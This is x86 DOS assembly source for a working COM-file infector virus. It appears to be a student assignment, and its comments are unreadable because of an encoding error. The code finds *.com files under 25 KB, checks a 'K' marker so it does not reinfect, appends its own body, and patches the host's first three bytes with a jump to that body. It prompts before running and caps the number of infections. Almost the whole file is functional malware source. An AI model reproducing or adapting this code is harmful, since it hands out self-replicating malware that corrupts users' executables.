prg segment
    assume cs:prg,ds:prg,es:prg,ss:prg
    org 100h				;�������������� ����� ��� PSP (Program Segment Prefix)

start:
	jmp	vir					;�������� ���������� ��������� ����
	org 110h				;���������� ��������� ���� � ������ 110h
	
vir:
	push	ds				;���������� �������� DS � ����
	mov	ax, ds				;������������� �������� DS
	db 05h					;��� �������
add_to_ds:				
	dw 0					;"ADD AX, 00h"
	mov	ds, ax				;AX->DS
	
							;�������������� ��������� ��������� - ����������� ������ 3-� ����
fresh_bytes:
	mov	al, old_bytes
	mov	cs:[100h], al
	mov	al, old_bytes + 1
	mov	cs:[101h], al
	mov	al, old_bytes + 2
	mov	cs:[102h], al
	
	mov	cx, 80h				;������ DTA(Data Transfer Arrea) - 128 ����
	mov	bx, 80h				;�������� � DTA
	lea	si, old_dta			;����� �������
	
save_dta:
	mov	al, byte ptr cs:[bx];������ �� DTA ���� �
	mov	ds:[si], al			;����������� ��� � ������ � ������ �����
	inc	bx					
	inc	si
	loop	save_dta		;���� 128 ���
	
	;������ �� ���������
	mov	ah, 09h
	lea	dx, message
	int	21h
	mov	ah, 09h
	lea	dx, messInputCount
	int	21h
	mov	ah, 08h
	int	21h
	mov dl, al
	mov al, 02h
	int 21h
	sub al, 30h
	mov byte ptr count_files, al
	
	mov	ah, 09h
	lea	dx, questionStart
	int	21h
waitAnswer:
	mov	ah, 08h
	int	21h
	cmp	al, 'y'
	jz	find_first
	cmp	al, 'n' 
	jmp	restore_dta
	
	
find_first:
	mov	ah, 4eh				;����� ������� �����
	mov	cx, 100010b		;normal(0x00), archive, hidden
	lea	dx, maska			;����� ��� ������
	int	21h
	jnc	r_3					;���� ������
	jmp	restore_dta			;��� ������ - ���������� ���������
find_next:
	mov	ah, 3eh				;��������  �������������
	int	21h					;�����
	jnc	r_2
	jmp	restore_dta			;���� ���������� �������
r_2:
	mov	ah, 4fh				;�����
	int	21h					;����������
	jnc	r_3					;���� ������
	jmp	restore_dta			;��� ������ - ���������� ���������
r_3:
	mov	cx, 12				;�������� � ������
	lea	si, fn				;"fn" �����  ����������� �����
destroy_name:
	mov	byte ptr [si], 0
	inc	si
	loop	destroy_name

	xor si,si				;������ � ����� ����� ������
copy_name:					;��� ���������� �����
	mov	al, byte ptr cs:[si + 9eh]
	cmp	al, 0
	je	open				;� ����� ����� �
	mov	byte ptr ds:fn[si], al	;DTA ������ �����
	inc	si					;����, ��� �
	
	jmp	copy_name			;���������� �������
	
open:
	mov	ax, 3d02h			;�������� ����� ��� ������ � ������
	lea	dx, fn				;��� �����
	int	21h
	jnc	save_bytes
	jmp	restore_dta			;���� ���������� �������
	
	;������� ��� �����:
save_bytes:
	mov	bx, ax				;���������� ����������� � BX
	mov	ah, 3fh				;����� �������
	mov	cx, 3
	lea	dx, old_bytes		;����� ��� ����������� ������
	int	21h
	jnc	found_size
	jmp	close				;��� ������ - �������� �����
	
found_size:
	mov	ax, cs:[09ah]
	
	;���������� ������� �����
count_size:
	mov	si, ax
	cmp	ax, 25600			;���� ������� 25 �����?
	jna	toto				;���
	jmp	find_next			;�� - ������������ ����
toto:
	test	ax, 000fh		;���������� ������� (���������� � - ��������� �� �����������)
	jz	krat_16				;�� ������ �����
	or	ax, 000fh			;���������� � (���������� ��� - ��������� �����������, ������ ��������������� 000fh
	inc	ax					;������� �������
	
krat_16:
	mov	di, ax				;������  ������������  �������� � DI
	
	;������  �������� ��� �������� �� ��� ������
	sub	ax, 3				;���� ������� �������� �������� 3 �����
	mov	byte ptr new_bytes[1], al
	mov	byte ptr new_bytes[2], ah
	
	;�������� �������
	mov	ax ,di				;���������� ����������,
	mov	cl, 4				;������� ��������
	shr	ax, cl				;���������� ���������
	dec	ax					;���� �������� ��������� "ORG 110h"
	mov	byte ptr add_to_ds, al
	mov	byte ptr add_to_ds + 1, ah
	
	;�������������� ����� �������
	mov	ax, 4200h			;���������
	xor	cx, cx				;��������� ��
	dec	si					;��������� ����
	mov	dx, si				;�����
	int	21h
	jnc	read_last
	jmp	close				;��� ������ - �������� �����
	
read_last:
	mov	ah, 3fh				;���������� �����
	mov	cx, 1				;�����
	lea	dx, last			;� ������ "last"
	int	21h                     
	jc	close				;��� ������ - �������� �����

	cmp	last, 'K'			;"last" = "I"
	jne	write_vir			;��� - ������
	jmp	find_next			;�� - ����� ������� �����
	
write_vir:
	mov	ax, 4200h			;���������
	xor	cx, cx				;���������
	mov	dx, di				;�� ����� �����
	int	21h
	jc	close				;��� ������ - �������� �����
	mov	ah, 40h				;������  � ����
	mov	cx, vir_len			;���� ������
	lea	dx, vir				;������ vir_len
	int	21h
	jc	close				;��� ������ - �������� �����
write_bytes:
	mov	ax, 4200h			;���������
	xor	cx, cx				;���������
	xor	dx, dx				;�� ������ �����
	int	21h
	jc	close				;��� ������ - �������� �����
	mov	ah, 40h				;������ �  ����
	mov	cx, 3				;������ ��� ����
	lea	dx, new_bytes		;(�������
	int	21h					;��������)
	
close:
	mov	ah, 3eh				;�������� �����������
	int	21h					;�����
	
	inc	files_infected		;������� ����������
	mov	ah, 09h
	lea	dx, fileMess
	int	21h
	mov	ah, 09h
	lea	dx, fn
	int	21h
	mov	al, files_infected	;��������� ������
	cmp	al, byte ptr count_files				;���� ������ 1,
	jge	restore_dta			;�� ���������� ���������,
	jmp	find_first			;����� �����������
	
restore_dta:
	mov	cx, 80h				;������ DTA - 128 ����
	mov	bx, 80h				;�������� � DTA
	lea	si, old_dta			;����� �������
dta_fresh:
	mov	al, ds:[si]			;������ �� ������� "old_dta"
	mov	byte ptr cs:[bx], al;����� �  ����������� ��� � DTA
	inc	bx					;� ������ �����
	inc	si
	loop	dta_fresh

	pop	ds					;�������������� ������������ DS
	push	cs				;��������� � ���� �������� CS
	db 0b8h					;��� �������
jump:
	dw 100h					;"MOV AX, 100h"
	push	ax				;��������� � ���� ����� 100h
	retf					;�������� ���������� �� �������� �����
	
old_bytes db 0e9h			;�������� ��� �����
          dw  vir_len + 0dh	;���������� ���������
old_dta db 128 dup (0)		;������ ��� �������� �������� DTA ���������
maska db '*.com', 0			;����� ��� ������ ������
fn db 12 dup (' '), '$',0 		;������ ��� �������� ��� ����� - ������

new_bytes db 0e9h			;������ ���
          db 00h			;����� ������
          db 00h			;� �����

message db 10, 13, 'Dmitry Klyuchnikov B_EVMd-41', 10, 13, 'Variant #1: ', 10, 13, 'Virus infects COM-files size less 25kb and attributes: Normal, Archive, Hidden. Infect 1 file', 10, 13 ,10, 13, '$'
questionStart db 10, 13,'Do you wish to start virus? (Y/N)', 10, 13, '$'
messInputCount db 'Input count files: ', '$'
mess db 10,13, 'Count Infect: ', '$'
fileMess db 10, 13, 'File Infect: ', '$'

files_infected db 0			;���������� �������������� ������
count_files db 0
last db 0					;������ ��� ���������� �����
     db 'K'					;��������� ���� ������ � �����
vir_len equ $ - vir			;����� ��������� ����
prg_end:
	mov	ah, 4ch				;����������
	int	21h					;����������� ���������
     db 'K'					;��� �����  ������� �����  ������� �� ��� ����
prg ends
end start